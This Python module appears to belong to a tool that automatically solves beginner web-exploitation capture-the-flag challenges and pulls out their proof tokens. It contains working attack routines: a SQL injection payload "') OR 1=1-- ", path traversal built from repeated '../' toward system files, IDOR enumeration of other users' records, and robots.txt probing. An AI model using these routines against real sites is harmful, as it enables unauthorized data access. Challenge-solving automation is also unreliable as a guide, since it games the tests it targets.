"""Fresh-target speed readers for the first observed Web challenge families.

No answer is stored here.  Each reader uses structural evidence from the fresh
target and returns one proof only when it is absent from its controls and is
the sole proof-shaped value on the exploit payoff responses.

The ranked runner dispatches here only for Days 1--5 and requires the fresh
contract fingerprint to match the tracked production-shape loopback qualification.
"""
from __future__ import annotations

import html
import json
import re
import time
from urllib.parse import parse_qsl, quote, urlencode, urlsplit

from speedrun.web_target import (
    Response, TargetClient, WebAnswers, prepare_tls_context, proof_tokens, solve_fresh_targets,
    target_identity,
)


LANE = "web"
PREFIX = "web-exploitation-day-"
TARGET_MODE = True
TARGET_REQUEST_BUDGET = 64
SUPPORTED_DAYS = frozenset(range(1, 6))
# Exact saved production contracts, not a generic "day N has N slots" rule.
MASTERY_TARGET_COUNTS = {1: 2, 2: 2, 3: 2, 4: 2, 5: 2}
HREF = re.compile(r"(?is)\bhref\s*=\s*(['\"])(.*?)\1")
FORM = re.compile(r"(?is)<form\b([^>]*)>(.*?)</form\s*>")
ACTION = re.compile(r"(?is)\baction\s*=\s*(['\"])(.*?)\1")
INPUT = re.compile(r"(?is)<input\b[^>]*\bname\s*=\s*(['\"])([A-Za-z][A-Za-z0-9_-]{0,63})\1")
ABS_FILE = re.compile(r"(?<![A-Za-z0-9_.-])/(?:run|etc|opt|srv|var)/(?:[A-Za-z0-9_.-]+/)*[A-Za-z0-9_.-]+")


def prepare(_root=None):
    prepare_tls_context()


def _tokens(*responses: Response) -> set[str]:
    found = set()
    for response in responses:
        found.update(proof_tokens(response.body))
    return found


def _one(payoffs, controls) -> str | None:
    eligible = [response for response in payoffs if 200 <= response.status < 300]
    novel = _tokens(*eligible) - _tokens(*controls)
    return next(iter(novel)) if len(novel) == 1 else None


def _text(response: Response) -> str:
    return response.body.decode("utf-8", "replace")


def _same_origin_path(value: str) -> str | None:
    value = html.unescape(str(value)).strip()
    parsed = urlsplit(value)
    if parsed.scheme or parsed.netloc or parsed.fragment or not parsed.path.startswith("/"):
        return None
    return parsed.path + (("?" + parsed.query) if parsed.query else "")


def _links(response: Response) -> list[str]:
    out = []
    for _quote, raw in HREF.findall(_text(response)):
        path = _same_origin_path(raw)
        if path and path not in out:
            out.append(path)
    return out


def _json(response: Response):
    try:
        value = json.loads(response.body.decode("utf-8"))
    except (UnicodeError, ValueError):
        return None
    return value


def _day(attempt: dict, ctx: dict) -> int | None:
    value = ctx.get("day")
    if isinstance(value, int) and not isinstance(value, bool):
        return value
    base = str(ctx.get("base") or ctx.get("challenge") or "")
    match = re.search(r"web-exploitation-day-(\d+)-", base)
    return int(match.group(1)) if match else None


def _backup(client: TargetClient, _attempt: dict) -> str | None:
    root = client.get(client.root)
    robots = client.get("/robots.txt")
    controls = [root, robots]
    payoffs = []
    paths = []
    for raw in _text(robots).splitlines():
        if ":" not in raw or raw.split(":", 1)[0].strip().lower() != "disallow":
            continue
        path = _same_origin_path(raw.split(":", 1)[1].strip())
        if path and path not in paths:
            paths.append(path)
    if len(paths) != 1:
        return None
    listing = client.get(paths[0])
    controls.append(listing)
    for path in _links(listing):
        if path.startswith(paths[0]) and not path.endswith("/"):
            payoffs.append(client.get(path))
    return _one(payoffs, controls) if payoffs else None


def _idor(client: TargetClient, _attempt: dict) -> str | None:
    root = client.get(client.root)
    root_links = _links(root)
    feeds = [path for path in root_links if path.startswith("/api/")]
    object_pages = [path for path in root_links if re.search(r"/\d+(?:\?|$)", path)]
    if len(feeds) != 1 or not object_pages:
        return None
    feed = client.get(feeds[0])
    doc = _json(feed)
    if not isinstance(doc, dict) or not isinstance(doc.get("current_user"), str) \
            or not isinstance(doc.get("events"), list):
        return None
    current = doc["current_user"]
    owners = {}
    for event in doc["events"]:
        if not isinstance(event, dict):
            return None
        ident = event.get("case_id")
        owner = event.get("owner")
        if not isinstance(ident, int) or isinstance(ident, bool) or not isinstance(owner, str):
            return None
        owners[ident] = owner
    page = client.get(object_pages[0])
    matches = re.findall(r"/api/[A-Za-z0-9_-]+/(\d+)", _text(page))
    prefixes = re.findall(r"(/api/[A-Za-z0-9_-]+/)(?:\d+)", _text(page))
    if len(set(prefixes)) != 1 or not matches:
        return None
    prefix = prefixes[0]
    controls = [root, feed, page]
    payoffs = []
    for ident, owner in sorted(owners.items()):
        response = client.get(prefix + str(ident))
        (controls if owner == current else payoffs).append(response)
    return _one(payoffs, controls) if payoffs else None


def _sqli(client: TargetClient, _attempt: dict) -> str | None:
    root = client.get(client.root)
    forms = FORM.findall(_text(root))
    if len(forms) != 1:
        return None
    attrs, body = forms[0]
    action_match = ACTION.search(attrs)
    inputs = {m[1] for m in INPUT.findall(body)}
    if action_match is None or len(inputs) != 1:
        return None
    action = _same_origin_path(action_match.group(2))
    if action is None or "?" in action:
        return None
    name = next(iter(inputs))
    control = client.get(action + "?" + urlencode({name: ""}))
    exploit = client.get(action + "?" + urlencode({name: "') OR 1=1-- "}))
    return _one([exploit], [root, control])


def _lfi(client: TargetClient, attempt: dict) -> str | None:
    root = client.get(client.root)
    location = root.headers.get("location")
    reader = _same_origin_path(location) if location else None
    if reader is None:
        links = _links(root)
        reader = links[0] if len(links) == 1 else None
    if reader is None:
        return None
    base = client.get(reader)
    links = _links(base)
    params = []
    for link in links:
        parsed = urlsplit(link)
        params.extend(key for key, _value in parse_qsl(parsed.query, keep_blank_values=True))
    if len(set(params)) != 1:
        return None
    param = params[0]
    files = sorted({value.rstrip(".,;:!?)]}")
                    for value in ABS_FILE.findall(str(attempt.get("prompt") or ""))})
    if len(files) != 1:
        return None
    path = files[0]
    payoffs = []
    for depth in (4, 6, 8, 3, 5, 2, 10):
        separator = "&" if "?" in reader else "?"
        payload = "../" * depth + path.lstrip("/")
        response = client.get(reader + separator + urlencode({param: payload}))
        payoffs.append(response)
        if _one(payoffs, [root, base]) is not None:
            break
    return _one(payoffs, [root, base])


def _route(client: TargetClient, _attempt: dict) -> str | None:
    root = client.get(client.root)
    candidates = [path for path in _links(root) if path.startswith("/api/")]
    if len(candidates) != 1:
        return None
    clues = client.get(candidates[0])
    doc = _json(clues)
    raw_route = doc.get("feature_route") if isinstance(doc, dict) else None
    route = _same_origin_path(raw_route) if isinstance(raw_route, str) else None
    # Saved D5-family rotations used process-, dispatch-, and submit- routes.
    # Keep this a single clue-authored, same-origin GET with an exact random
    # suffix; no route guessing or broad endpoint crawl is permitted.
    if route is None or not re.fullmatch(r"/(?:dispatch|process|submit)-[0-9a-f]{6,64}", route):
        return None
    payoff = client.get(route)
    return _one([payoff], [root, clues])


EARLY_READERS = {1: _backup, 2: _idor, 3: _sqli, 4: _lfi, 5: _route}
READERS = EARLY_READERS


def _mode(ctx: dict) -> str | None:
    value = ctx.get("mode")
    if value in ("time_trial", "mastery"):
        return value
    match = re.search(r"/(time_trial|mastery)$", str(ctx.get("challenge") or ""))
    return match.group(1) if match else None


def contract_problem(attempt: dict, ctx: dict) -> str | None:
    """Why a saved/fresh target contract is unsafe for this reader, or ``None``."""
    day = _day(attempt, ctx)
    if day not in SUPPORTED_DAYS or day not in READERS:
        return f"Web day {day!r} has no qualified speed reader"
    if attempt.get("artifacts") or attempt.get("downloads") or attempt.get("download"):
        return "target contract unexpectedly advertises an artifact delivery"
    mode = _mode(ctx)
    if attempt.get("mode") != mode:
        return f"target contract mode {attempt.get('mode')!r} does not match {mode!r}"
    targets, answer_ids, questions = (attempt.get("targets"), attempt.get("answer_ids"),
                                      attempt.get("questions"))
    if not isinstance(targets, list) or not isinstance(answer_ids, list) or not isinstance(questions, list):
        return "targets, answer_ids and questions must be lists"
    if not targets or len(targets) > 16 or len(targets) != len(answer_ids) or len(questions) != len(answer_ids):
        return "targets, answer_ids and questions have an unsupported cardinality"
    if mode == "time_trial":
        expected = 1
    elif mode == "mastery":
        expected = MASTERY_TARGET_COUNTS.get(day)
    else:
        expected = None
    if expected is None or len(targets) != expected:
        return f"saved {mode!r} contract expects {expected} target(s), got {len(targets)}"
    seen = set()
    identities = set()
    for target, aid, question in zip(targets, answer_ids, questions):
        if not isinstance(target, dict) or not isinstance(aid, str) or not aid or aid in seen \
                or not isinstance(question, dict):
            return "target/question binding is malformed or ambiguous"
        if question.get("id") not in (None, aid):
            return "question id does not match its answer id"
        if target.get("id") and question.get("artifact") \
                and str(target["id"]) != str(question["artifact"]):
            return "target id does not match the question artifact"
        try:
            identity = target_identity(target.get("url"))
        except Exception as exc:
            return f"target URL is unsafe: {exc}"
        if identity in identities:
            return "multiple answer ids name the same assigned target"
        identities.add(identity)
        seen.add(aid)
    return None

def solve_target(attempt: dict, ctx: dict) -> WebAnswers:
    day = _day(attempt, ctx)
    if day not in READERS or contract_problem(attempt, ctx):
        return WebAnswers()
    deadline = ctx.get("deadline")
    if not isinstance(deadline, (int, float)) or isinstance(deadline, bool):
        return WebAnswers()
    try:
        requested_budget = int(ctx.get("max_requests") or TARGET_REQUEST_BUDGET)
    except (TypeError, ValueError):
        return WebAnswers()
    request_budget = max(1, min(requested_budget, TARGET_REQUEST_BUDGET))
    total = len(attempt["targets"])

    def reader(client, current, index):
        # Saved Masteries are cumulative: earlier numbered slots retain that
        # numbered family and the final slot is the current day's family.
        family = day if index == total else index
        selected = EARLY_READERS.get(family)
        return selected(client, current) if selected is not None else None

    values = solve_fresh_targets(
        attempt, reader, deadline=float(deadline), max_requests=request_budget,
        indexed=True)
    answers = WebAnswers(values)
    answers.target_requests = getattr(values, "target_requests", None)
    return answers


def solve(_attempt: dict, _deliveries: list, _ctx: dict) -> WebAnswers:
    """Artifact entry point: Web modes have no artifact and therefore decline."""
    return WebAnswers()
